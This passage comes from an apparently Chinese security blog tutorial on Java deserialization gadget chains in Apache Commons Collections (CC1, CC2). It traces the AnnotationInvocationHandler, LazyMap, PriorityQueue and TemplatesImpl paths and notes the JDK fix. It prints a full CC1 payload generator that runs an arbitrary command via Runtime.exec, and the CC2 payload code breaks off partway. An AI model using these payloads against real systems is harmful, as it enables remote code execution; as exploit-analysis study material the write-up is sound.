<p>在构建AnnotationInvocationHandler时传入的第一个类是Override.class，是因为其构造函数要求第一个参数是一个注解类，而Override.class是一个自带的注解类</p>
<p>但同样的，我们还需要一个能调用Map的方法的函数，因为最初的触发点得是readObject，而AnnotationInvocationHandler这个类的readObject刚好就有这个功能</p>
<pre class=" language-java"><code class="language-java"><span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">readObject</span><span class="token punctuation">(</span>ObjectInputStream var1<span class="token punctuation">)</span> <span class="token keyword">throws</span> IOException<span class="token punctuation">,</span> ClassNotFoundException <span class="token punctuation">{</span>
        var1<span class="token punctuation">.</span><span class="token function">defaultReadObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        AnnotationType var2 <span class="token operator">=</span> null<span class="token punctuation">;</span>

        <span class="token keyword">try</span> <span class="token punctuation">{</span>
            var2 <span class="token operator">=</span> AnnotationType<span class="token punctuation">.</span><span class="token function">getInstance</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>type<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IllegalArgumentException</span> var9<span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">InvalidObjectException</span><span class="token punctuation">(</span><span class="token string">"Non-annotation type in annotation serial stream"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>

        Map var3 <span class="token operator">=</span> var2<span class="token punctuation">.</span><span class="token function">memberTypes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        Iterator var4 <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>memberValues<span class="token punctuation">.</span><span class="token function">entrySet</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">iterator</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
    <span class="token punctuation">}</span>
</code></pre>
<p>这一句<code>Iterator var4 = this.memberValues.entrySet().iterator();</code>调用了map的entrySet，完成了一条从readObject到RCE的完全路径<br><strong>外层的这个handler只是因为他刚好readObject可以触发这个代理类</strong></p>
<h3 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h3><p>因此最后再创建一个AnnotationInvocationHandler对象，并且把我们的代理类赋值进去，由此我们能拼凑出整个CC1的payload</p>
<pre class=" language-java"><code class="language-java"><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>Transformer<span class="token punctuation">;</span>
<span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>functors<span class="token punctuation">.</span>ChainedTransformer<span class="token punctuation">;</span>
<span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>functors<span class="token punctuation">.</span>ConstantTransformer<span class="token punctuation">;</span>
<span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>functors<span class="token punctuation">.</span>InvokerTransformer<span class="token punctuation">;</span>
<span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>map<span class="token punctuation">.</span>LazyMap<span class="token punctuation">;</span>

<span class="token keyword">import</span> java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span>Constructor<span class="token punctuation">;</span>
<span class="token keyword">import</span> java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span>InvocationHandler<span class="token punctuation">;</span>
<span class="token keyword">import</span> java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span>Proxy<span class="token punctuation">;</span>
<span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>HashMap<span class="token punctuation">;</span>
<span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>Map<span class="token punctuation">;</span>


<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">CC1</span> <span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> InvocationHandler <span class="token function">getPayload</span><span class="token punctuation">(</span>String command<span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception <span class="token punctuation">{</span>
        <span class="token keyword">final</span> String<span class="token punctuation">[</span><span class="token punctuation">]</span> args <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">{</span>command<span class="token punctuation">}</span><span class="token punctuation">;</span>
        <span class="token keyword">final</span> Transformer transformerChain <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ChainedTransformer</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>
                <span class="token keyword">new</span> <span class="token class-name">ConstantTransformer</span><span class="token punctuation">(</span>Runtime<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"getMethod"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">{</span>String<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> Class<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span> <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token string">"getRuntime"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"invoke"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>Object<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> Object<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>null<span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"exec"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>String<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">,</span> args<span class="token punctuation">)</span><span class="token punctuation">,</span>
                <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token keyword">final</span> HashMap innerMap <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">final</span> Map lazyMap <span class="token operator">=</span> LazyMap<span class="token punctuation">.</span><span class="token function">decorate</span><span class="token punctuation">(</span>innerMap<span class="token punctuation">,</span> transformerChain<span class="token punctuation">)</span><span class="token punctuation">;</span>
        Constructor constructor <span class="token operator">=</span> Class<span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"sun.reflect.annotation.AnnotationInvocationHandler"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredConstructor</span><span class="token punctuation">(</span>Class<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> Map<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        constructor<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">final</span> InvocationHandler temp <span class="token operator">=</span> <span class="token punctuation">(</span>InvocationHandler<span class="token punctuation">)</span> constructor<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span>Override<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> lazyMap<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">final</span> Map mapProxy <span class="token operator">=</span> <span class="token punctuation">(</span>Map<span class="token punctuation">)</span> Proxy<span class="token punctuation">.</span><span class="token function">newProxyInstance</span><span class="token punctuation">(</span>temp<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getClassLoader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>Map<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">,</span> temp<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">final</span> InvocationHandler handler <span class="token operator">=</span> <span class="token punctuation">(</span>InvocationHandler<span class="token punctuation">)</span> constructor<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span>Override<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> mapProxy<span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token keyword">return</span> handler<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre>
<h3 id="修复方案"><a href="#修复方案" class="headerlink" title="修复方案"></a>修复方案</h3><p>说过这个链其实不能用了，因为在远古远古版本就已经修掉了<br>维修的方法就是直接把memberValue改成定值，不可控了自然就没法反序列化了<br>新版readObject</p>
<pre class=" language-java"><code class="language-java">    <span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">readObject</span><span class="token punctuation">(</span>java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>ObjectInputStream s<span class="token punctuation">)</span>
        <span class="token keyword">throws</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>IOException<span class="token punctuation">,</span> ClassNotFoundException <span class="token punctuation">{</span>
        ObjectInputStream<span class="token punctuation">.</span>GetField fields <span class="token operator">=</span> s<span class="token punctuation">.</span><span class="token function">readFields</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token annotation punctuation">@SuppressWarnings</span><span class="token punctuation">(</span><span class="token string">"unchecked"</span><span class="token punctuation">)</span>
        Class<span class="token operator">&lt;</span><span class="token operator">?</span> <span class="token keyword">extends</span> <span class="token class-name">Annotation</span><span class="token operator">></span> t <span class="token operator">=</span> <span class="token punctuation">(</span>Class<span class="token operator">&lt;</span><span class="token operator">?</span> <span class="token keyword">extends</span> <span class="token class-name">Annotation</span><span class="token operator">></span><span class="token punctuation">)</span>fields<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"type"</span><span class="token punctuation">,</span> null<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token annotation punctuation">@SuppressWarnings</span><span class="token punctuation">(</span><span class="token string">"unchecked"</span><span class="token punctuation">)</span>
        Map<span class="token operator">&lt;</span>String<span class="token punctuation">,</span> Object<span class="token operator">></span> streamVals <span class="token operator">=</span> <span class="token punctuation">(</span>Map<span class="token operator">&lt;</span>String<span class="token punctuation">,</span> Object<span class="token operator">></span><span class="token punctuation">)</span>fields<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"memberValues"</span><span class="token punctuation">,</span> null<span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment" spellcheck="true">// Check to make sure that types have not evolved incompatibly</span>

        AnnotationType annotationType <span class="token operator">=</span> null<span class="token punctuation">;</span>
        <span class="token keyword">try</span> <span class="token punctuation">{</span>
            annotationType <span class="token operator">=</span> AnnotationType<span class="token punctuation">.</span><span class="token function">getInstance</span><span class="token punctuation">(</span>t<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span> <span class="token keyword">catch</span><span class="token punctuation">(</span>IllegalArgumentException e<span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token comment" spellcheck="true">// Class is no longer an annotation type; time to punch out</span>
            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>InvalidObjectException</span><span class="token punctuation">(</span><span class="token string">"Non-annotation type in annotation serial stream"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>

        Map<span class="token operator">&lt;</span>String<span class="token punctuation">,</span> Class<span class="token operator">&lt;</span><span class="token operator">?</span><span class="token operator">>></span> memberTypes <span class="token operator">=</span> annotationType<span class="token punctuation">.</span><span class="token function">memberTypes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment" spellcheck="true">// consistent with runtime Map type</span>
        Map<span class="token operator">&lt;</span>String<span class="token punctuation">,</span> Object<span class="token operator">></span> mv <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">LinkedHashMap</span><span class="token operator">&lt;</span><span class="token operator">></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment" spellcheck="true">// If there are annotation members without values, that</span>
        <span class="token comment" spellcheck="true">// situation is handled by the invoke method.</span>
        <span class="token keyword">for</span> <span class="token punctuation">(</span>Map<span class="token punctuation">.</span>Entry<span class="token operator">&lt;</span>String<span class="token punctuation">,</span> Object<span class="token operator">></span> memberValue <span class="token operator">:</span> streamVals<span class="token punctuation">.</span><span class="token function">entrySet</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            String name <span class="token operator">=</span> memberValue<span class="token punctuation">.</span><span class="token function">getKey</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            Object value <span class="token operator">=</span> null<span class="token punctuation">;</span>
            Class<span class="token operator">&lt;</span><span class="token operator">?</span><span class="token operator">></span> memberType <span class="token operator">=</span> memberTypes<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>memberType <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token comment" spellcheck="true">// i.e. member still exists</span>
                value <span class="token operator">=</span> memberValue<span class="token punctuation">.</span><span class="token function">getValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span>memberType<span class="token punctuation">.</span><span class="token function">isInstance</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span> <span class="token operator">||</span>
                      value <span class="token keyword">instanceof</span> <span class="token class-name">ExceptionProxy</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                    value <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">AnnotationTypeMismatchExceptionProxy</span><span class="token punctuation">(</span>
                            value<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"["</span> <span class="token operator">+</span> value <span class="token operator">+</span> <span class="token string">"]"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">setMember</span><span class="token punctuation">(</span>
                                annotationType<span class="token punctuation">.</span><span class="token function">members</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token punctuation">}</span>
            <span class="token punctuation">}</span>
            mv<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> value<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>

        UnsafeAccessor<span class="token punctuation">.</span><span class="token function">setType</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">,</span> t<span class="token punctuation">)</span><span class="token punctuation">;</span>
        UnsafeAccessor<span class="token punctuation">.</span><span class="token function">setMemberValues</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">,</span> mv<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
</code></pre>
<p>最后一句强行设定了memberValue<br>跟了一下，影响的是内层用于触发LazyMap.get的那个handler，内层handler本来是代理的LazyMap类变成了代理LinkedHashMap类，然后走到get的时候走的是LinkedHashMap.get，计划大失败</p>
<h2 id="CC2"><a href="#CC2" class="headerlink" title="CC2"></a>CC2</h2><p>只能打Common Collections 4，需要极低版本，约等于没有用。因为在Common Collections 3中TransformingComparator这个类没有实现Serializable接口</p>
<h3 id="调用栈-1"><a href="#调用栈-1" class="headerlink" title="调用栈"></a>调用栈</h3><pre class=" language-java"><code class="language-java">Gadget chain<span class="token operator">:</span>
    ObjectInputStream<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
        PriorityQueue<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
            <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
            TransformingComparator<span class="token punctuation">.</span><span class="token function">compare</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
                InvokerTransformer<span class="token punctuation">.</span><span class="token function">transform</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
                    Method<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
                        Runtime<span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre>
<h3 id="TemplateImpl"><a href="#TemplateImpl" class="headerlink" title="TemplateImpl"></a>TemplateImpl</h3><p>这个类的特点是当调用其getOutputProperties方法时，会一路调用最终将自己的_bytecodes属性作为字节码进行类的加载，并进行类的实例化。使用javassit可以动态修改类的字节码，在类的static块中添加任意代码，并放到_bytecodes属性中触发，即可在类实例化时得到执行</p>
<pre class=" language-java"><code class="language-java">    <span class="token keyword">private</span> Translet <span class="token function">getTransletInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token keyword">throws</span> TransformerConfigurationException <span class="token punctuation">{</span>
        <span class="token keyword">try</span> <span class="token punctuation">{</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>_name <span class="token operator">==</span> null<span class="token punctuation">)</span> <span class="token keyword">return</span> null<span class="token punctuation">;</span>

            <span class="token keyword">if</span> <span class="token punctuation">(</span>_class <span class="token operator">==</span> null<span class="token punctuation">)</span> <span class="token function">defineTransletClasses</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

            <span class="token comment" spellcheck="true">// The translet needs to keep a reference to all its auxiliary</span>
            <span class="token comment" spellcheck="true">// class to prevent the GC from collecting them</span>
            AbstractTranslet translet <span class="token operator">=</span> <span class="token punctuation">(</span>AbstractTranslet<span class="token punctuation">)</span> _class<span class="token punctuation">[</span>_transletIndex<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
    <span class="token punctuation">}</span>
    
    
    <span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">defineTransletClasses</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token keyword">throws</span> TransformerConfigurationException <span class="token punctuation">{</span>

        <span class="token keyword">if</span> <span class="token punctuation">(</span>_bytecodes <span class="token operator">==</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>
            ErrorMsg err <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ErrorMsg</span><span class="token punctuation">(</span>ErrorMsg<span class="token punctuation">.</span>NO_TRANSLET_CLASS_ERR<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">TransformerConfigurationException</span><span class="token punctuation">(</span>err<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>

        TransletClassLoader loader <span class="token operator">=</span> <span class="token punctuation">(</span>TransletClassLoader<span class="token punctuation">)</span>
            AccessController<span class="token punctuation">.</span><span class="token function">doPrivileged</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">PrivilegedAction</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token keyword">public</span> Object <span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                    <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">TransletClassLoader</span><span class="token punctuation">(</span>ObjectFactory<span class="token punctuation">.</span><span class="token function">findClassLoader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>_tfactory<span class="token punctuation">.</span><span class="token function">getExternalExtensionsMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token punctuation">}</span>
            <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token keyword">try</span> <span class="token punctuation">{</span>
            <span class="token keyword">final</span> <span class="token keyword">int</span> classCount <span class="token operator">=</span> _bytecodes<span class="token punctuation">.</span>length<span class="token punctuation">;</span>
            _class <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span>classCount<span class="token punctuation">]</span><span class="token punctuation">;</span>

            <span class="token keyword">if</span> <span class="token punctuation">(</span>classCount <span class="token operator">></span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                _auxClasses <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token operator">&lt;</span><span class="token operator">></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>

            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> classCount<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                _class<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> loader<span class="token punctuation">.</span><span class="token function">defineClass</span><span class="token punctuation">(</span>_bytecodes<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
    <span class="token punctuation">}</span>
</code></pre>
<p>在defineTransletClasses中<code>_class[i] = loader.defineClass(_bytecodes[i]);</code>进行加载，而加载完成后在getTransletInstance中<code>AbstractTranslet translet = (AbstractTranslet) _class[_transletIndex].newInstance();</code>进行实例化</p>
<h3 id="从PriorityQueue到InvokerTransformer"><a href="#从PriorityQueue到InvokerTransformer" class="headerlink" title="从PriorityQueue到InvokerTransformer"></a>从PriorityQueue到InvokerTransformer</h3><p>顺着看吧，出发点必然是PriorityQueue的readObject方法，其最后调用了一个heapify()方法，听起来就是堆排序，而heapify方法里面也就只调用了一个函数siftDown，siftDown在comparator不为null时调用siftDownUsingComparator，siftDownUsingComparator调用comparator的compare方法（怪不得yso里面的链子打了省略号。。原来这一路上的函数调用连分叉都没有）</p>
<p>看到TransformingComparator的compare方法，直接对自己的transformer进行transform了</p>
<pre class=" language-java"><code class="language-java">    <span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">compare</span><span class="token punctuation">(</span>I obj1<span class="token punctuation">,</span> I obj2<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        O value1 <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>transformer<span class="token punctuation">.</span><span class="token function">transform</span><span class="token punctuation">(</span>obj1<span class="token punctuation">)</span><span class="token punctuation">;</span>
        O value2 <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>transformer<span class="token punctuation">.</span><span class="token function">transform</span><span class="token punctuation">(</span>obj2<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>decorated<span class="token punctuation">.</span><span class="token function">compare</span><span class="token punctuation">(</span>value1<span class="token punctuation">,</span> value2<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
</code></pre>
<p><strong>invokerTransformer可以调用一个类的public方法</strong>，所以直接调用templateImpl的getOutputProperties实现rce<br><strong>而templateImpl反序列化时可以执行任意长度任意数量的代码，约等于PHP的eval</strong></p>
<h3 id="payload-1"><a href="#payload-1" class="headerlink" title="payload"></a>payload</h3><pre class=" language-java"><code class="language-java"><span class="token keyword">import</span> com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>runtime<span class="token punctuation">.</span>AbstractTranslet<span class="token punctuation">;</span>
<span class="token keyword">import</span> com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>trax<span class="token punctuation">.</span>TemplatesImpl<span class="token punctuation">;</span>
<span class="token keyword">import</span> com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>trax<span class="token punctuation">.</span>TransformerFactoryImpl<span class="token punctuation">;</span>
<span class="token keyword">import</span> javassist<span class="token punctuation">.</span>*<span class="token punctuation">;</span>
<span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections4<span class="token punctuation">.</span>comparators<span class="token punctuation">.</span>TransformingComparator<span class="token punctuation">;</span>
<span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections4<span class="token punctuation">.</span>functors<span class="token punctuation">.</span>InvokerTransformer<span class="token punctuation">;</span>

<span class="token keyword">import</span> java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span>Field<span class="token punctuation">;</span>
<span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>PriorityQueue<span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">CC2</span> <span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> Object <span class="token function">getPayload</span><span class="token punctuation">(</span><span class="token keyword">final</span> String command<span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception <span class="token punctuation">{</span>
        ClassPool pool <span class="token operator">=</span> ClassPool<span class="token punctuation">.</span><span class="token function">getDefault</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        pool<span class="token punctuation">.</span><span class="token function">insertClassPath</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ClassClassPath</span><span class="token punctuation">(</span>AbstractTranslet<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        CtClass cc <span class="token operator">=</span> pool<span class="token punctuation">.</span><span class="token function">makeClass</span><span class="token punctuation">(</span><span class="token string">"Cat"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
